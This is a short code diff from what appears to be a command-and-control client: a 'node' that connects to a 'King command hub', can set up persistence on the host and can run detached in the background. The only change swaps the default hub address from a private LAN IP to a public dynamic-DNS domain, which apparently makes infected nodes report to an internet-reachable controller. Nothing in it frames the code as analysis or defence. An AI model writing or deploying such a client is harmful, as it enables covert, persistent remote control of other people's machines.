@@ -1034,7 +1034,7 @@ def connect_to_hub(hub_ip, port):
 def parse_args():
     """Parse command-line arguments."""
     parser = argparse.ArgumentParser(description='Node client for connecting to the King command hub')
-    parser.add_argument('--hub-ip', default=os.getenv('KING_HUB_IP', '192.168.100.9'), help='IP address of the King command hub')
+    parser.add_argument('--hub-ip', default=os.getenv('KING_HUB_IP', 'mowgliorg.duckdns.org'), help='IP address of the King command hub')
     parser.add_argument('--hub-port', type=int, default=int(os.getenv('KING_HUB_PORT', '9999')), help='Port of the King command hub')
     parser.add_argument('--no-persist', action='store_true', help='Do not establish persistence (for testing)')
     parser.add_argument('--detached', action='store_true', help='Run in background')
